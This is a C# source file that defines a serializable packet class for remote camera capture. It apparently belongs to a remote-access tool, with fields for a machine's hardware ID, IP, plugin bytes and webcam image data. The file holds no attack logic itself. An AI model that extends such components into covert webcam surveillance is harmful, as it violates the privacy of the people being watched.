using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class RemoteCameraCapturePacket : IPacket
    {
        public RemoteCameraCapturePacket(PacketType packetType) : base()
        {
            this.packetType = packetType;
        }

        public RemoteCameraCapturePacket(byte[] cameraCapture) : base()
        {
            this.packetType = PacketType.RC_CAPTURE_ON;

            this.cameraCapture = cameraCapture;
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public PacketState packetState { get; set; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }
        public int packetSize { get; set; }

        public int quality { get; set; }
        public int index { get; set; }
        public byte[] cameraCapture { get; set; }
        public int timeMS { get; set; }
    }
}
